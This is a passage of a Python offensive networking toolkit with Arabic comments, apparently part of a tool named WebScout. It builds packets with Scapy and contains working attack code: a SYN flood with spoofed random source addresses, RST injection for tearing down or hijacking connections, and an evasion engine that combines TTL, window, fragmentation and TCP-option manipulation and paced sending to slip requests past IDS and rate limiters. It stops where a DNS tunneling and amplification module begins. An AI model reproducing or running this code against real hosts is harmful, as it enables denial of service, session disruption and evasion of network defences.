            "opt_keys":   opts_keys,
            "window":     tcp_reply.window,
            "guessed_os": guessed_os,
        }
        log("INFO", f"[TCPOpts] Target fingerprint: OS≈{guessed_os} | opts={opts_keys}")
        return result

    def report(self) -> Dict[str, Any]:
        """أعد تقريراً بكل مجموعات الخيارات المُرسَلة."""
        return {
            "strategy":       self.strategy,
            "fake_os":        self.fake_os,
            "packets_sent":   len(self._opts_log),
            "options_log":    self._opts_log,
        }


# ════════════════════════════════════════════════════════════════════════
#  MODULE 5 — CUSTOM TCP STACK (مكتبة TCP مخصصة)
# ════════════════════════════════════════════════════════════════════════

class CustomTCPStack:
    """
    آلة حالة TCP كاملة مُنفَّذة بـ Python / Scapy.

    توفر تحكماً كاملاً في كل مرحلة من مراحل اتصال TCP:
    CLOSED → SYN_SENT → ESTABLISHED → FIN_WAIT → TIME_WAIT → CLOSED

    الفائدة الأمنية:
    ─────────────────────────────────────────────────────────────────────
    - إرسال حزم TCP بأعلام وقيم لا تُنتجها المكدسات القياسية.
    - تجاوز قيود نواة نظام التشغيل (kernel TCP stack).
    - دعم كل تقنيات التلاعب الأخرى (TTL, Window, Options) في سياق
      اتصال كامل ومُدار يدوياً.
    - محاكاة هجمات: SYN Flood, RST Injection, Session Hijacking.

    متطلبات: scapy (pip install scapy)
    """

    class State(enum.Enum):
        CLOSED      = "CLOSED"
        SYN_SENT    = "SYN_SENT"
        SYN_RCVD    = "SYN_RCVD"
        ESTABLISHED = "ESTABLISHED"
        FIN_WAIT_1  = "FIN_WAIT_1"
        FIN_WAIT_2  = "FIN_WAIT_2"
        TIME_WAIT   = "TIME_WAIT"
        CLOSE_WAIT  = "CLOSE_WAIT"
        LAST_ACK    = "LAST_ACK"

    def __init__(
        self,
        dst_ip: str,
        dst_port: int,
        src_port: int = 0,
        ttl: int = 64,
        window: int = 29200,
        tcp_options: list = None,
        timeout: float = 3.0,
    ):
        """
        Args:
            dst_ip:      عنوان IP الهدف.
            dst_port:    المنفذ الهدف.
            src_port:    المنفذ المحلي (0 = عشوائي).
            ttl:         قيمة IP TTL.
            window:      حجم TCP Window.
            tcp_options: TCP Options مخصصة (list of tuples).
            timeout:     مهلة الانتظار لكل رد.
        """
        if not HAS_SCAPY:
            raise RuntimeError(
                "CustomTCPStack يتطلب scapy. نفّذ: pip install scapy"
            )
        self.dst_ip      = dst_ip
        self.dst_port    = dst_port
        self.src_port    = src_port or random.randint(1024, 65535)
        self.ttl         = ttl
        self.window      = window
        self.tcp_options = tcp_options or [
            ("MSS", 1460), ("NOP", None), ("NOP", None),
            ("SAckOK", b""), ("WScale", 7),
        ]
        self.timeout     = timeout
        # حالة الاتصال
        self.state       = self.State.CLOSED
        self.client_seq  = random.randint(10000, 2**31)
        self.server_seq  = 0
        self.server_ack  = 0
        # سجل كامل لكل الحزم
        self._pkt_log: List[Dict[str, Any]] = []

    # ── بناء حزمة IP/TCP داخلياً ──────────────────────────────────────
    def _build_pkt(
        self,
        flags: str,
        payload: bytes = b"",
        extra_opts: list = None,
    ) -> Any:
        """بناء حزمة IP/TCP بالإعدادات الحالية للـ stack."""
        opts = extra_opts if extra_opts is not None else self.tcp_options
        tcp = TCP(
            sport=self.src_port,
            dport=self.dst_port,
            flags=flags,
            seq=self.client_seq,
            ack=self.server_seq,
            window=self.window,
            options=opts,
        )
        ip  = IP(dst=self.dst_ip, ttl=self.ttl)
        pkt = ip / tcp / Raw(load=payload) if payload else ip / tcp
        return pkt

    # ── تسجيل الحزمة ──────────────────────────────────────────────────
    def _log_pkt(self, direction: str, flags: str, seq: int, ack: int, length: int = 0):
        self._pkt_log.append({
            "direction": direction,
            "flags":     flags,
            "seq":       seq,
            "ack":       ack,
            "length":    length,
            "timestamp": time.time(),
            "state":     self.state.value,
        })

    # ── المصافحة الثلاثية (Three-Way Handshake) ──────────────────────
    def connect(self) -> bool:
        """
        نفّذ مصافحة TCP ثلاثية (SYN → SYN-ACK → ACK).

        Returns:
            True إذا نجح الاتصال، False إذا فشل.
        """
        # ── SYN ──────────────────────────────────────────────────────
        syn_pkt = self._build_pkt(flags="S")
        self._log_pkt("TX", "SYN", self.client_seq, 0)
        self.state = self.State.SYN_SENT
        log("INFO", f"[TCP-Stack] SYN → {self.dst_ip}:{self.dst_port} | seq={self.client_seq}")

        syn_ack = sr1(syn_pkt, timeout=self.timeout, verbose=0)
        if syn_ack is None:
            log("WARN", f"[TCP-Stack] SYN-ACK timeout — {self.dst_ip}:{self.dst_port}")
            self.state = self.State.CLOSED
            return False

        if not syn_ack.haslayer(TCP) or "S" not in syn_ack[TCP].flags or "A" not in syn_ack[TCP].flags:
            log("WARN", f"[TCP-Stack] Unexpected reply flags: {syn_ack[TCP].flags}")
            self.state = self.State.CLOSED
            return False

        # تحديث أرقام التسلسل
        self.server_seq = syn_ack[TCP].seq + 1
        self.client_seq += 1
        self._log_pkt("RX", "SYN-ACK", syn_ack[TCP].seq, syn_ack[TCP].ack)

        # ── ACK ──────────────────────────────────────────────────────
        ack_pkt = self._build_pkt(flags="A")
        send(ack_pkt, verbose=0)
        self._log_pkt("TX", "ACK", self.client_seq, self.server_seq)
        self.state = self.State.ESTABLISHED
        log("OK", f"[TCP-Stack] ESTABLISHED — {self.dst_ip}:{self.dst_port}")
        return True

    # ── إرسال بيانات ──────────────────────────────────────────────────
    def send_data(self, data: bytes) -> Optional[Any]:
        """
        أرسل بيانات في حالة ESTABLISHED.

        Args:
            data: البيانات بالبايت.

        Returns:
            الرد (حزمة Scapy) أو None.
        """
        if self.state != self.State.ESTABLISHED:
            raise RuntimeError(
                f"send_data() في حالة {self.state.value} غير ESTABLISHED"
            )
        pkt = self._build_pkt(flags="PA", payload=data, extra_opts=[])
        self._log_pkt("TX", "PSH-ACK", self.client_seq, self.server_seq, len(data))
        log("INFO",
            f"[TCP-Stack] PSH-ACK {len(data)}B → {self.dst_ip}:{self.dst_port}"
        )
        reply = sr1(pkt, timeout=self.timeout, verbose=0)
        if reply and reply.haslayer(TCP):
            self.server_seq = reply[TCP].seq + (
                len(reply[TCP].payload) if reply[TCP].payload else 0
            )
            self.client_seq += len(data)
            self._log_pkt("RX", reply[TCP].flags, reply[TCP].seq, reply[TCP].ack)
        return reply

    # ── إنهاء الاتصال بلطف (FIN Handshake) ──────────────────────────
    def close(self) -> bool:
        """
        أغلق الاتصال بإرسال FIN-ACK وانتظار الرد.

        Returns:
            True إذا أُغلق بشكل نظيف.
        """
        if self.state not in (self.State.ESTABLISHED, self.State.CLOSE_WAIT):
            self.state = self.State.CLOSED
            return False
        fin_pkt = self._build_pkt(flags="FA", extra_opts=[])
        send(fin_pkt, verbose=0)
        self._log_pkt("TX", "FIN-ACK", self.client_seq, self.server_seq)
        self.state = self.State.FIN_WAIT_1
        log("INFO", f"[TCP-Stack] FIN-ACK → {self.dst_ip}:{self.dst_port}")
        self.state = self.State.TIME_WAIT
        # انتظر قصير قبل الإغلاق الكامل
        time.sleep(0.1)
        self.state = self.State.CLOSED
        log("OK", f"[TCP-Stack] Connection CLOSED — {self.dst_ip}:{self.dst_port}")
        return True

    # ── إعادة تعيين الاتصال (RST Injection) ─────────────────────────
    def reset(self, inject_seq: int = None) -> None:
        """
        أرسل حزمة RST لإنهاء الاتصال فوراً أو حقن RST في اتصال آخر.

        Args:
            inject_seq: رقم تسلسل مخصص للـ RST (لهجوم RST Injection).
        """
        seq = inject_seq if inject_seq is not None else self.client_seq
        rst_pkt = IP(dst=self.dst_ip, ttl=self.ttl) / TCP(
            sport=self.src_port, dport=self.dst_port,
            flags="R", seq=seq, window=0,
        )
        send(rst_pkt, verbose=0)
        self._log_pkt("TX", "RST", seq, 0)
        self.state = self.State.CLOSED
        log("WARN", f"[TCP-Stack] RST injected → {self.dst_ip}:{self.dst_port} seq={seq}")

    # ── هجوم SYN Flood ────────────────────────────────────────────────
    @staticmethod
    def syn_flood(
        dst_ip: str,
        dst_port: int,
        count: int = 100,
        spoof_ip: bool = True,
        inter: float = 0.001,
    ) -> int:
        """
        أرسل حزم SYN متعددة من عناوين IP مزيفة (SYN Flood test).
        للاستخدام الاختباري المصرح به فقط.

        Args:
            count:     عدد الحزم.
            spoof_ip:  استخدام عناوين مصدر عشوائية.
            inter:     الفاصل بين الحزم.

        Returns:
            عدد الحزم المُرسَلة.
        """
        if not HAS_SCAPY:
            raise RuntimeError("syn_flood() يتطلب scapy.")
        sent = 0
        log("WARN",
            f"[TCP-Stack] SYN Flood TEST: {count} packets → {dst_ip}:{dst_port}"
        )
        for _ in range(count):
            src = (
                f"{random.randint(1,223)}.{random.randint(0,255)}."
                f"{random.randint(0,255)}.{random.randint(1,254)}"
                if spoof_ip else None
            )
            pkt = (
                IP(dst=dst_ip, src=src) / TCP(
                    sport=random.randint(1024, 65535),
                    dport=dst_port, flags="S",
                    seq=random.randint(0, 2**32-1),
                )
            )
            send(pkt, verbose=0)
            sent += 1
            time.sleep(inter)
        log("OK", f"[TCP-Stack] SYN Flood: {sent} packets sent")
        return sent

    # ── دورة طلب HTTP كاملة عبر الـ stack المخصص ────────────────────
    def http_request(self, path: str = "/", host: str = None) -> Optional[bytes]:
        """
        نفّذ طلب HTTP GET كامل عبر آلة الحالة المخصصة.

        Returns:
            محتوى الرد كـ bytes أو None.
        """
        if not self.connect():
            return None
        h = host or self.dst_ip
        req = f"GET {path} HTTP/1.0\r\nHost: {h}\r\nConnection: close\r\n\r\n"
        reply = self.send_data(req.encode())
        self.close()
        if reply and reply.haslayer(Raw):
            return bytes(reply[Raw].load)
        return None

    def report(self) -> Dict[str, Any]:
        """أعد تقريراً بكل حزم الـ stack المخصص."""
        return {
            "dst_ip":       self.dst_ip,
            "dst_port":     self.dst_port,
            "final_state":  self.state.value,
            "packets_sent": sum(1 for p in self._pkt_log if p["direction"] == "TX"),
            "packets_recv": sum(1 for p in self._pkt_log if p["direction"] == "RX"),
            "pkt_log":      self._pkt_log,
        }


# ════════════════════════════════════════════════════════════════════════
#  MODULE 6 — TCP CONGESTION CONTROL SIMULATOR (محاكاة ازدحام الشبكة)
# ════════════════════════════════════════════════════════════════════════

class TCPCongestionSimulator:
    """
    محاكاة خوارزميات التحكم في الازدحام TCP (Congestion Control).

    الخوارزميات المدعومة:
    ─────────────────────────────────────────────────────────────────────
    RENO         — الخوارزمية الكلاسيكية (Slow Start + AIMD).
    CUBIC        — الخوارزمية الافتراضية في Linux (مكعبية النمو).
    BBR          — Bottleneck Bandwidth and RTT (Google, 2016).
    VEGAS        — مبنية على RTT وليس الفقدان.
    TAHOE        — أقدم خوارزمية (Slow Start + Congestion Avoidance).
    WESTWOOD     — مُحسَّنة للاتصالات اللاسلكية.
    HIGHSPEED    — للشبكات عالية السرعة (RFC 3649).

    الفائدة الأمنية:
    ─────────────────────────────────────────────────────────────────────
    - محاكاة أنماط إرسال مختلفة لتجنب الكشف القائم على التحليل الزمني.
    - هجوم "Slow Congestion": تقليد متعمد لسلوك شبكة مزدحمة لتعطيل
      أنظمة تحديد سرعة الإرسال (rate limiters).
    - اختبار استجابة الخادم لأنماط إرسال غير متوقعة.
    - إرسال بيانات بأنماط cwnd مضبوطة يدوياً للتحايل على IDS.

    المصطلحات:
    ─────────────────────────────────────────────────────────────────────
    cwnd         — Congestion Window (نافذة الازدحام) بـ MSS.
    ssthresh     — Slow Start Threshold (عتبة البداية البطيئة).
    RTT          — Round Trip Time (زمن الرحلة ذهاباً وإياباً).
    MSS          — Maximum Segment Size (أقصى حجم للمقطع).
    """

    MSS_DEFAULT: int = 1460   # بايت

    def __init__(
        self,
        algorithm: str = "CUBIC",
        initial_cwnd: int = 10,
        initial_ssthresh: int = 65535,
        mss: int = 1460,
        rtt_ms: float = 50.0,
        bandwidth_kbps: float = 10000.0,
    ):
        """
        Args:
            algorithm:        خوارزمية التحكم في الازدحام.
            initial_cwnd:     حجم نافذة الازدحام الابتدائي (بـ MSS).
            initial_ssthresh: عتبة Slow Start الابتدائية (بـ MSS).
            mss:              Maximum Segment Size بالبايت.
            rtt_ms:           RTT المقدّر بالميلي ثانية.
            bandwidth_kbps:   عرض النطاق المتاح بـ kbps.
        """
        self.algorithm    = algorithm.upper()
        self.cwnd         = float(initial_cwnd)
        self.ssthresh     = float(initial_ssthresh)
        self.mss          = mss
        self.rtt_ms       = rtt_ms
        self.bandwidth_kbps = bandwidth_kbps
        self._ack_count   = 0
        self._loss_count  = 0
        self._round       = 0
        self._history: List[Dict[str, Any]] = []

        # متغيرات خاصة بالخوارزميات
        # CUBIC
        self._cubic_wmax   = float(initial_cwnd)
        self._cubic_t0     = time.time()
        self._cubic_k      = 0.0
        self._C            = 0.4      # ثابت CUBIC
        # BBR
        self._bbr_btlbw    = bandwidth_kbps * 1000 / 8   # bytes/sec
        self._bbr_rtprop   = rtt_ms / 1000.0             # ثانية
        self._bbr_pacing_gain = 1.0
        # Vegas
        self._vegas_base_rtt = rtt_ms / 1000.0
        self._vegas_alpha    = 2
        self._vegas_beta     = 4

    # ── خطوة واحدة (حزمة ACK واحدة مُستلَمة) ────────────────────────
    def on_ack(self, bytes_acked: int = None) -> float:
        """
        حدّث حالة نافذة الازدحام عند استلام ACK.

        Args:
            bytes_acked: عدد البايتات التي تم تأكيدها (None = MSS).

        Returns:
            قيمة cwnd الجديدة بالمقاطع (MSS).
        """
        if bytes_acked is None:
            bytes_acked = self.mss
        self._ack_count += 1
        self._round += 1
        old_cwnd = self.cwnd

        if self.algorithm == "RENO":
            self._reno_on_ack()
        elif self.algorithm == "TAHOE":
            self._tahoe_on_ack()
        elif self.algorithm == "CUBIC":
            self._cubic_on_ack(bytes_acked)
        elif self.algorithm == "BBR":
            self._bbr_on_ack()
        elif self.algorithm == "VEGAS":
            self._vegas_on_ack()
        elif self.algorithm == "WESTWOOD":
            self._westwood_on_ack(bytes_acked)
        elif self.algorithm == "HIGHSPEED":
            self._highspeed_on_ack()
        else:
            self._reno_on_ack()

        self._record(event="ACK", old_cwnd=old_cwnd)
        return self.cwnd

    # ── حدث فقدان حزمة ────────────────────────────────────────────────
    def on_loss(self, timeout: bool = False) -> float:
        """
        حدّث الحالة عند اكتشاف فقدان حزمة.

        Args:
            timeout:  True إذا كان الفقدان بسبب timeout (أسوأ من dup-ACK).

        Returns:
            قيمة cwnd الجديدة.
        """
        self._loss_count += 1
        old_cwnd = self.cwnd

        if self.algorithm == "RENO":
            if timeout:
                # Timeout: إعادة التعيين الكاملة
                self.ssthresh = max(self.cwnd / 2, 2.0)
                self.cwnd     = 1.0
            else:
                # Triple Dup-ACK: Fast Retransmit
                self.ssthresh = max(self.cwnd / 2, 2.0)
                self.cwnd     = self.ssthresh

        elif self.algorithm == "TAHOE":
            # Tahoe: إعادة تعيين دائماً
            self.ssthresh = max(self.cwnd / 2, 2.0)
            self.cwnd     = 1.0

        elif self.algorithm == "CUBIC":
            self._cubic_wmax   = self.cwnd
            self.ssthresh      = max(self.cwnd * 0.7, 2.0)
            self.cwnd          = self.ssthresh
            self._cubic_t0     = time.time()
            self._cubic_k      = (self._cubic_wmax * 0.3 / self._C) ** (1/3)

        elif self.algorithm == "BBR":
            # BBR لا يتفاعل مع الفقدان بنفس الطريقة — يقلل معامل الإرسال
            self._bbr_pacing_gain = max(0.5, self._bbr_pacing_gain * 0.75)

        elif self.algorithm == "VEGAS":
            self.cwnd = max(self.cwnd - 1, 1.0)

        elif self.algorithm == "WESTWOOD":
            # Westwood: يُقدّر BWE لحساب ssthresh
            bwe = self._bbr_btlbw  # نستخدم نفس المتغير كتقدير
            self.ssthresh = max((bwe * self._vegas_base_rtt) / self.mss, 2.0)
            self.cwnd     = self.ssthresh if not timeout else 1.0

        elif self.algorithm == "HIGHSPEED":
            self.ssthresh = max(self.cwnd * 0.85, 2.0)
            self.cwnd     = self.ssthresh

        self._record(event="LOSS", old_cwnd=old_cwnd)
        log("WARN",
            f"[Cong] Loss event | algo={self.algorithm} | "
            f"cwnd: {old_cwnd:.1f}→{self.cwnd:.1f} MSS | "
            f"ssthresh={self.ssthresh:.1f}"
        )
        return self.cwnd

    # ── خوارزمية Reno ─────────────────────────────────────────────────
    def _reno_on_ack(self):
        if self.cwnd < self.ssthresh:
            self.cwnd += 1.0                      # Slow Start
        else:
            self.cwnd += 1.0 / self.cwnd          # Congestion Avoidance (AIMD)

    # ── خوارزمية Tahoe ────────────────────────────────────────────────
    def _tahoe_on_ack(self):
        if self.cwnd < self.ssthresh:
            self.cwnd += 1.0
        else:
            self.cwnd += 1.0 / self.cwnd

    # ── خوارزمية CUBIC ────────────────────────────────────────────────
    def _cubic_on_ack(self, bytes_acked: int):
        t         = time.time() - self._cubic_t0
        w_cubic   = self._C * (t - self._cubic_k) ** 3 + self._cubic_wmax
        if w_cubic < self.cwnd:
            # TCP-friendly mode
            self.cwnd += 1.0 / self.cwnd
        else:
            self.cwnd = max(self.cwnd, w_cubic)
        self.cwnd = min(self.cwnd, 65535.0)

    # ── خوارزمية BBR ──────────────────────────────────────────────────
    def _bbr_on_ack(self):
        # BBR يتحكم في معدل الإرسال (pacing rate) وليس cwnd مباشرةً
        # هنا نحاكي تأثيره على cwnd
        bdp = (self._bbr_btlbw * self._bbr_rtprop) / self.mss
        self.cwnd = max(bdp * self._bbr_pacing_gain, 4.0)
        self.cwnd = min(self.cwnd, 65535.0)

    # ── خوارزمية Vegas ────────────────────────────────────────────────
    def _vegas_on_ack(self):
        # Vegas تُقارن الإنتاجية المتوقعة والفعلية عبر RTT
        expected = self.cwnd / self._vegas_base_rtt
        actual   = self.cwnd / (self.rtt_ms / 1000.0)
        diff     = (expected - actual) * self._vegas_base_rtt
        if diff < self._vegas_alpha:
            self.cwnd += 1.0 / self.cwnd
        elif diff > self._vegas_beta:
            self.cwnd -= 1.0 / self.cwnd
        self.cwnd = max(1.0, self.cwnd)

    # ── خوارزمية Westwood ─────────────────────────────────────────────
    def _westwood_on_ack(self, bytes_acked: int):
        # Westwood: يُقدّر BWE باستمرار
        bwe = bytes_acked / (self.rtt_ms / 1000.0)
        # تمهيد أسي للـ BWE
        alpha = 0.9
        self._bbr_btlbw = alpha * self._bbr_btlbw + (1 - alpha) * bwe
        # تحديث cwnd مثل Reno
        if self.cwnd < self.ssthresh:
            self.cwnd += 1.0
        else:
            self.cwnd += 1.0 / self.cwnd

    # ── خوارزمية HighSpeed ────────────────────────────────────────────
    def _highspeed_on_ack(self):
        # HighSpeed TCP: معدل زيادة أعلى لـ cwnd الكبيرة
        if self.cwnd < self.ssthresh:
            self.cwnd += 1.0
        else:
            # معدل الزيادة يتناسب مع log2(cwnd)
            increase = max(1.0, 0.01 * log2(max(self.cwnd, 2)))
            self.cwnd += increase / self.cwnd
        self.cwnd = min(self.cwnd, 65535.0)

    # ── تسجيل الحالة ──────────────────────────────────────────────────
    def _record(self, event: str, old_cwnd: float):
        self._history.append({
            "round":     self._round,
            "event":     event,
            "algorithm": self.algorithm,
            "old_cwnd":  round(old_cwnd, 2),
            "new_cwnd":  round(self.cwnd, 2),
            "ssthresh":  round(self.ssthresh, 2),
            "rtt_ms":    self.rtt_ms,
            "timestamp": time.time(),
        })

    # ── محاكاة إرسال بيانات حقيقي مع تطبيق الخوارزمية ───────────────
    def simulate_transfer(
        self,
        total_bytes: int,
        loss_rate: float = 0.01,
        rtt_variation_ms: float = 5.0,
    ) -> Dict[str, Any]:
        """
        محاكاة نقل بيانات كامل مع تطبيق خوارزمية الازدحام.

        Args:
            total_bytes:       إجمالي البيانات المراد نقلها.
            loss_rate:         معدل فقدان الحزم (0.0–1.0).
            rtt_variation_ms:  تشويش عشوائي على RTT.

        Returns:
            إحصائيات النقل.
        """
        sent_bytes    = 0
        rounds_needed = 0
        total_loss    = 0
        log("INFO",
            f"[Cong] Simulating {total_bytes}B transfer | "
            f"algo={self.algorithm} | loss={loss_rate*100:.1f}%"
        )
        while sent_bytes < total_bytes:
            # تغيير بسيط في RTT
            self.rtt_ms = max(1.0,
                self.rtt_ms + random.gauss(0, rtt_variation_ms)
            )
            # حجم الإرسال في هذه الجولة (cwnd * MSS)
            send_this_round = int(self.cwnd) * self.mss
            send_this_round = min(send_this_round, total_bytes - sent_bytes)
            # محاكاة الفقدان
            if random.random() < loss_rate:
                total_loss    += 1
                is_timeout     = random.random() < 0.3
                self.on_loss(timeout=is_timeout)
            else:
                self.on_ack(bytes_acked=send_this_round)
                sent_bytes += send_this_round
            rounds_needed += 1
            # محاكاة تأخير RTT الحقيقي
            time.sleep(min(self.rtt_ms / 1000.0, 0.01))

        log("OK",
            f"[Cong] Transfer complete: {sent_bytes}B in {rounds_needed} rounds "
            f"| losses={total_loss} | final cwnd={self.cwnd:.1f} MSS"
        )
        return {
            "algorithm":    self.algorithm,
            "total_bytes":  sent_bytes,
            "rounds":       rounds_needed,
            "total_losses": total_loss,
            "final_cwnd":   round(self.cwnd, 2),
            "final_ssthresh": round(self.ssthresh, 2),
        }

    # ── تطبيق تأخير الإرسال بناءً على الخوارزمية ─────────────────────
    def pacing_delay(self) -> float:
        """
        احسب التأخير المناسب بين حزمة وأخرى (packet pacing).
        يُستخدم لتطبيق الخوارزمية على إرسال حقيقي.

        Returns:
            التأخير بالثواني.
        """
        if self.algorithm == "BBR":
            # BBR يُحدد معدل الإرسال بدقة
            if self._bbr_btlbw > 0:
                delay = self.mss / self._bbr_btlbw
            else:
                delay = 0.001
        elif self.algorithm in ("RENO", "TAHOE", "CUBIC"):
            # تأخير بسيط بناءً على cwnd و RTT
            delay = (self.rtt_ms / 1000.0) / max(self.cwnd, 1.0)
        elif self.algorithm == "VEGAS":
            delay = self._vegas_base_rtt / max(self.cwnd, 1.0)
        else:
            delay = 0.001
        return max(delay, 0.0001)

    # ── دمج مع CustomTCPStack لإرسال بيانات محكوم ────────────────────
    def controlled_send(
        self,
        tcp_stack: "CustomTCPStack",
        data: bytes,
        chunk_size: int = None,
    ) -> int:
        """
        أرسل بيانات عبر CustomTCPStack مع تطبيق التحكم في الازدحام.

        Args:
            tcp_stack:  كائن CustomTCPStack في حالة ESTABLISHED.
            data:       البيانات الكاملة.
            chunk_size: حجم كل جزء (None = cwnd * MSS).

        Returns:
            إجمالي البايتات المُرسَلة.
        """
        sent_total = 0
        offset     = 0
        while offset < len(data):
            if chunk_size is None:
                cs = max(1, int(self.cwnd)) * self.mss
            else:
                cs = chunk_size
            chunk = data[offset:offset + cs]
            try:
                reply = tcp_stack.send_data(chunk)
                if reply and reply.haslayer(TCP):
                    # ACK وصل
                    self.on_ack(bytes_acked=len(chunk))
                else:
                    # لا رد — افتراض فقدان
                    self.on_loss(timeout=True)
                sent_total += len(chunk)
                offset     += len(chunk)
                time.sleep(self.pacing_delay())
            except Exception as e:
                log("WARN", f"[Cong-Send] Error: {e}")
                self.on_loss(timeout=True)
                break
        log("OK",
            f"[Cong-Send] Sent {sent_total}B via CustomTCPStack "
            f"| algo={self.algorithm} | cwnd={self.cwnd:.1f}"
        )
        return sent_total

    def report(self) -> Dict[str, Any]:
        """أعد تقريراً إحصائياً بسجل نافذة الازدحام."""
        cwnd_values = [h["new_cwnd"] for h in self._history]
        return {
            "algorithm":      self.algorithm,
            "total_rounds":   self._round,
            "ack_events":     self._ack_count,
            "loss_events":    self._loss_count,
            "final_cwnd":     round(self.cwnd, 2),
            "final_ssthresh": round(self.ssthresh, 2),
            "max_cwnd":       max(cwnd_values) if cwnd_values else 0,
            "min_cwnd":       min(cwnd_values) if cwnd_values else 0,
            "avg_cwnd":       round(
                sum(cwnd_values) / len(cwnd_values), 2
            ) if cwnd_values else 0,
            "history":        self._history,
        }


# ════════════════════════════════════════════════════════════════════════
#  TCP EVASION ENGINE — واجهة موحدة للوحدات الست
# ════════════════════════════════════════════════════════════════════════

class TCPEvasionEngine:
    """
    واجهة موحدة تجمع الوحدات الست لتلاعب الطبقة الشبكية في إطار عمل
    واحد متكامل يمكن استدعاؤه من WebScout.

    الاستخدام:
    ─────────────────────────────────────────────────────────────────────
        engine = TCPEvasionEngine(
            dst_ip="1.2.3.4", dst_port=80,
            ttl_strategy="OS_FINGERPRINT",
            window_strategy="TINY_WINDOW",
            frag_strategy="TINY_FRAGMENTS",
            opts_strategy="HYBRID_CONFUSION",
            congestion_algo="CUBIC",
        )
        result = engine.full_evasion_request(path="/login", payload=b"user=test")
        print(engine.full_report())
    """

    def __init__(
        self,
        dst_ip: str,
        dst_port: int = 80,
        ttl_strategy: str = "OS_FINGERPRINT",
        ttl_os: str = "linux",
        window_strategy: str = "OS_PROFILE",
        window_os: str = "linux",
        frag_strategy: str = "STANDARD",
        frag_size: int = 24,
        opts_strategy: str = "SHUFFLE_OPTIONS",
        opts_fake_os: str = "windows_10",
        congestion_algo: str = "CUBIC",
        rtt_ms: float = 50.0,
        timeout: float = 3.0,
        stealth_level: int = 5,
    ):
        self.dst_ip   = dst_ip
        self.dst_port = dst_port
        self.timeout  = timeout

        # إنشاء كل الوحدات
        self.ttl_engine   = TTLManipulator(
            strategy=ttl_strategy, target_os=ttl_os
        )
        self.win_engine   = TCPWindowManipulator(
            strategy=window_strategy, target_os=window_os
        )
        self.frag_engine  = IPFragmentationEngine(
            strategy=frag_strategy, frag_size=frag_size
        )
        self.opts_engine  = TCPOptionsObfuscator(
            strategy=opts_strategy, fake_os=opts_fake_os
        )
        self.congestion   = TCPCongestionSimulator(
            algorithm=congestion_algo, rtt_ms=rtt_ms
        )
        # CustomTCPStack يُنشأ عند الحاجة (يتطلب scapy)
        self._stack: Optional[CustomTCPStack] = None

    # ── طلب HTTP كامل مع كل التقنيات مجتمعة ────────────────────────
    def full_evasion_request(
        self,
        path: str = "/",
        host: str = None,
        payload: bytes = b"",
        use_fragmentation: bool = False,
    ) -> Dict[str, Any]:
        """
        أرسل طلب HTTP كامل بتطبيق جميع تقنيات التهرب الست.

        Args:
            path:             مسار الطلب.
            host:             اسم الخادم (Host header).
            payload:          بيانات POST إضافية.
            use_fragmentation: تفعيل تجزئة IP.

        Returns:
            dict يحتوي على نتيجة الطلب وتقارير الوحدات.
        """
        result: Dict[str, Any] = {
            "dst":    f"{self.dst_ip}:{self.dst_port}",
            "path":   path,
            "status": "pending",
        }
        h = host or self.dst_ip
        method  = "POST" if payload else "GET"
        headers = f"{method} {path} HTTP/1.0\r\nHost: {h}\r\nConnection: close\r\n"
        if payload:
            headers += f"Content-Length: {len(payload)}\r\n"
        headers += "\r\n"
        http_bytes = headers.encode() + payload

        ttl  = self.ttl_engine.compute_ttl()
        win  = self.win_engine.compute_window()
        opts = self.opts_engine.build_options()

        log("INFO",
            f"[TCPEvasion] {method} {self.dst_ip}:{self.dst_port}{path} | "
            f"TTL={ttl} Win={win} Opts={[o[0] for o in opts]}"
        )

        if use_fragmentation and HAS_SCAPY:
            # مسار التجزئة
            frags_sent = self.frag_engine.send_fragmented_tcp(
                self.dst_ip, self.dst_port, http_bytes
            )
            result["status"]      = "fragmented"
            result["frags_sent"]  = frags_sent
        elif HAS_SCAPY:
            # مسار CustomTCPStack مع كل التقنيات
            try:
                self._stack = CustomTCPStack(
                    dst_ip=self.dst_ip, dst_port=self.dst_port,
                    ttl=ttl, window=win, tcp_options=opts,
                    timeout=self.timeout,
                )
                if self._stack.connect():
                    # تطبيق الازدحام على الإرسال
                    delay = self.congestion.pacing_delay()
                    time.sleep(delay)
                    reply = self._stack.send_data(http_bytes)
                    self.congestion.on_ack(bytes_acked=len(http_bytes))
                    self._stack.close()
                    result["status"] = "sent"
                    if reply and reply.haslayer(Raw):
                        resp = bytes(reply[Raw].load)
                        result["response_head"] = resp[:512].decode(errors="replace")
                else:
                    result["status"] = "connect_failed"
            except Exception as e:
                result["status"] = f"error: {e}"
                self.congestion.on_loss(timeout=True)
        else:
            # Fallback: مقبس Python عادي مع TTL و Window
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                self.ttl_engine.apply_ttl_to_socket(sock, hop=0)
                self.win_engine.apply_window_to_socket(sock)
                sock.connect((self.dst_ip, self.dst_port))
                sock.sendall(http_bytes)
                self.congestion.on_ack(bytes_acked=len(http_bytes))
                resp = sock.recv(4096)
                sock.close()
                result["status"]        = "sent_fallback"
                result["response_head"] = resp[:512].decode(errors="replace")
            except Exception as e:
                result["status"] = f"error_fallback: {e}"
                self.congestion.on_loss(timeout=True)

        return result

    # ── تقرير شامل ───────────────────────────────────────────────────
    def full_report(self) -> Dict[str, Any]:
        """أعد تقريراً شاملاً لكل الوحدات."""
        rep: Dict[str, Any] = {
            "ttl_report":        self.ttl_engine.report(),
            "window_report":     self.win_engine.report(),
            "frag_report":       self.frag_engine.report(),
            "tcp_options_report":self.opts_engine.report(),
            "congestion_report": self.congestion.report(),
        }
        if self._stack is not None:
            rep["tcp_stack_report"] = self._stack.report()
        return rep

    # ── فحص موجز ─────────────────────────────────────────────────────
    def quick_probe(self) -> Dict[str, Any]:
        """
        فحص سريع: بصمة TCP + عدد الـ hops + تقدير نظام التشغيل.

        Returns:
            dict بنتائج الفحص.
        """
        results: Dict[str, Any] = {}
        if HAS_SCAPY:
            hop_dist = self.ttl_engine.probe_hop_distance(self.dst_ip, self.dst_port)
            fp       = self.opts_engine.fingerprint_target(self.dst_ip, self.dst_port)
            results["hop_distance"]  = hop_dist
            results["tcp_fingerprint"] = fp
        else:
            # Fallback: فحص بسيط بالمقبس
            try:
                sock = socket.create_connection(
                    (self.dst_ip, self.dst_port), timeout=self.timeout
                )
                sock.close()
                results["reachable"] = True
            except Exception as e:
                results["reachable"] = False
                results["error"]     = str(e)
        return results


# ════════════════════════════════════════════════════════════════════════
#  MODULE 7 — DNS TUNNELING & AMPLIFICATION ENGINE
#  تجاوز الجدران النارية عبر بروتوكول DNS
# ════════════════════════════════════════════════════════════════════════

class DNSNetworkEngine:
    """
